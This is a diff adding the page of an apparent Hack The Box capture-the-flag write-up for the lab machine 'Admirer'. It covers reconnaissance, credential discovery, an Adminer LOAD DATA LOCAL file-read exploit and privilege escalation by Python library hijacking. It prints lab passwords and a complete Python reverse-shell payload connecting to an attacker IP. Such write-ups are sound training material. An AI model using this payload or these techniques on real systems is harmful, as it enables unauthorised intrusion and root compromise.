@@ -1,0 +1,205 @@
+I"{+<p><strong><center>Ref°: HTB-16-Boot2Root</center></strong></p>
+
+<p><img src="/assets/images/admirer/HTB-Badge-Admirer.png" alt="Desktop View" /></p>
+
+<p>— Admirer is a vulnerable machine through web and database exploitation to gain foothold.</p>
+
+<p>Once on the victim machine, we escalate privilege through Sudo permission and Python library Hijacking from admin script execution under root privilege.</p>
+
+<p><img src="/assets/images/admirer/HTB-Information-Admirer.png" alt="Desktop View" /></p>
+
+<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
+<h3 id="network-service-scanning">Network Service Scanning</h3>
+<hr />
+<p>We find interesting services <code class="language-plaintext highlighter-rouge">ftp</code>, <code class="language-plaintext highlighter-rouge">web</code> and <code class="language-plaintext highlighter-rouge">ssh</code> on their usual ports.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-T5</span> 10.10.10.187 <span class="nt">-p-</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-nmap.png" alt="Desktop View" /></p>
+
+<h3 id="robotstxt">Robots.txt</h3>
+<hr />
+<p>The <code class="language-plaintext highlighter-rouge">robots.txt</code> file make reference about inindexable path <code class="language-plaintext highlighter-rouge">admin-dir</code>. This folder contains apparently “personal contacts” and “creds”.</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-robots.png" alt="Desktop View" /></p>
+
+<h3 id="fuzzing-website">Fuzzing Website</h3>
+<hr />
+<p>We fuzzing Website with <code class="language-plaintext highlighter-rouge">seclists wordlist</code> to recover two notes <code class="language-plaintext highlighter-rouge">contacts.txt</code> and <code class="language-plaintext highlighter-rouge">credentials.txt</code>:</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt <span class="nt">--hc</span> 404,403 http://10.10.10.187/admin-dir/FUZZ.txt
+</code></pre></div></div>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-fuzzing.png" alt="Desktop View" /></p>
+
+<p>From <code class="language-plaintext highlighter-rouge">http://10.10.10.187/admin-dir/contacts.txt</code>, the note reveal 5 mailbox with associated usernames and job title.</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-note1.png" alt="Desktop View" /></p>
+
+<p>And from <code class="language-plaintext highlighter-rouge">http://10.10.10.187/admin-dir/credentials.txt</code> we discover passwords :</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-note2.png" alt="Desktop View" /></p>
+
+<h3 id="file-transfert-protocol">File Transfert Protocol</h3>
+<hr />
+<p>We use the FTP account find above to recover <code class="language-plaintext highlighter-rouge">dump.sql</code> and <code class="language-plaintext highlighter-rouge">html.tar.gz</code>.</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-ftp.png" alt="Desktop View" /></p>
+
+<p>The dump SQL show us interesting informations about :</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-database_version.png" alt="Desktop View" /></p>
+
+<p>From html archive, we find new credential <code class="language-plaintext highlighter-rouge">waldo.11 : Ezy]m27}OREc$</code> in ../w4ld0s_s3cr3t_d1r/credentials.txt :</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-database_new_password.png" alt="Desktop View" /></p>
+
+<p>And an other credential set <code class="language-plaintext highlighter-rouge">waldo : Wh3r3_1s_w4ld0?</code> in ../utility-scripts/db_admin.php :</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-database_info.png" alt="Desktop View" /></p>
+
+<h3 id="adminer-tool">Adminer tool</h3>
+<hr />
+<p>php file reveal interesting information about an alternative to php database.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// TODO: Finish implementing this or find a better open source alternative
+</code></pre></div></div>
+
+<p>We find following site with Google search <a href="https://alternativeto.net/software/phpmyadmin/">https://alternativeto.net/software/phpmyadmin/</a></p>
+
+<p>Directly match wich alternative tool is used : <code class="language-plaintext highlighter-rouge">Admirer = Adminer</code></p>
+
+<p>And can confirm this to check : <a href="http://10.10.10.187/utility-scripts/adminer.php">http://10.10.10.187/utility-scripts/adminer.php</a></p>
+
+<h2 id="2-weaponization---find-exploit-way"><strong><span style="color:#c0392b">[2] Weaponization - Find exploit way</span></strong></h2>
+<h3 id="adminer-v462">Adminer v4.6.2</h3>
+<hr />
+<p>Adminer is a popular PHP tool to administer MySQL and PostgreSQL databases.</p>
+
+<p>The version 4.6.2 contain a security hole that allowing them to read files on servers using the LOAD DATA LOCAL INFILE statement.
+Attackers can abuse that to fetch passwords for popular apps such as Magento and Wordpress, and gain control of a site’s database.</p>
+
+<p>Reference exploit : <a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a></p>
+
+<h3 id="preparation-of-mysql-database-hosted">Preparation of MySQL database hosted</h3>
+<hr />
+<p>Database creation:</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-adminer_exploit1.png" alt="Desktop View" /></p>
+
+<p>Database configuration:</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-adminer_exploit2.png" alt="Desktop View" /></p>
+
+<p>Database connection:</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-adminer_exploit3.png" alt="Desktop View" /></p>
+
+<p>Table creation to receipt data from victim server:</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-adminer_exploit4.png" alt="Desktop View" /></p>
+
+<p>We are ready!</p>
+
+<h2 id="3-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[3] Foothold - Get into the target </span></strong></h2>
+<h3 id="adminer-exploitation">Adminer exploitation</h3>
+<hr />
+<p>Using the MySQL command <code class="language-plaintext highlighter-rouge">LOAD DATA LOCAL</code> to specifying a local file on the victim server. 
+This command is used to load data from a file local to the Adminer instance, into a database.</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-adminer_exploit5.png" alt="Desktop View" /></p>
+
+<p>And we recover new password from files stealing:</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-adminer_exploit6.png" alt="Desktop View" /></p>
+
+<p>We can now connect to adminer database of victim server:</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-adminer_exploit7.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-adminer_exploit8.png" alt="Desktop View" /></p>
+
+<h3 id="reusing-password-on-remote-service-ssh">Reusing Password on remote service SSH</h3>
+<hr />
+<p>But waldo user use the same password to login SSH service:</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-metasploit_ssh_check.png" alt="Desktop View" /></p>
+
+<h3 id="flag-user">Flag user</h3>
+<hr />
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-flag_user.png" alt="Desktop View" /></p>
+
+<h2 id="4-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[4] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
+<h3 id="sudo-permissions">Sudo permissions</h3>
+<hr />
+<p>User waldo can run following command without root password: (ALL) SETENV: /opt/scripts/admin_tasks.sh</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-sudo_permission.png" alt="Desktop View" /></p>
+
+<h3 id="python-library-hijacking">Python library Hijacking</h3>
+<hr />
+<p>linpeas scan reveal interesting script named <code class="language-plaintext highlighter-rouge">backup.py</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-rwxr----- 1 root admins 198 Dec  2  2019 /opt/scripts/backup.py
+</code></pre></div></div>
+
+<p>This script contain <code class="language-plaintext highlighter-rouge">shutil module</code> and we can hijacking this.</p>
+
+<p>He offers a number of high-level operations on files and collections of files. In particular, functions are provided which support file copying and removal.</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-backup_script.png" alt="Desktop View" /></p>
+
+<p>References about this exploit:</p>
+<ul>
+  <li><a href="https://docs.python.org/2/library/shutil.html">https://docs.python.org/2/library/shutil.html</a></li>
+  <li><a href="https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7">https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7</a></li>
+  <li><a href="https://bic-berkeley.github.io/psych-214-fall-2016/using_pythonpath.html">https://bic-berkeley.github.io/psych-214-fall-2016/using_pythonpath.html</a></li>
+  <li><a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">https://rastating.github.io/privilege-escalation-via-python-library-hijacking/</a></li>
+</ul>
+
+<p>We check execution path of shutil.py library:</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-check_path.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-check_path2.png" alt="Desktop View" /></p>
+
+<h3 id="payload-injection-in-malicious-library">Payload Injection in malicious library</h3>
+<hr />
+<p>Creation of malicious library shutil.py in /tmp/privuser45:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket
+import pty
+import os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.223",1337))
+
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
+</code></pre></div></div>
+
+<p>And we change the PYTHON path execution to launch the malicious library when we execute the script admin_tasks.sh under root privilege:</p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-path_change.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-execution.png" alt="Desktop View" /></p>
+
+<h3 id="obtaining-reverse-shell-and-flag-root">Obtaining Reverse Shell and Flag root</h3>
+<hr />
+
+<p><img src="/assets/images/admirer/HTB-Images-Admirer-flag_root.png" alt="Desktop View" /></p>
+
+<hr />
+
+<h2 id="trophy"><strong><center>Trophy</center></strong></h2>
+
+<blockquote>
+  <p><strong>We must know. We will know.</strong></p>
+
+  <p>David Hilbert</p>
+</blockquote>
+:ET
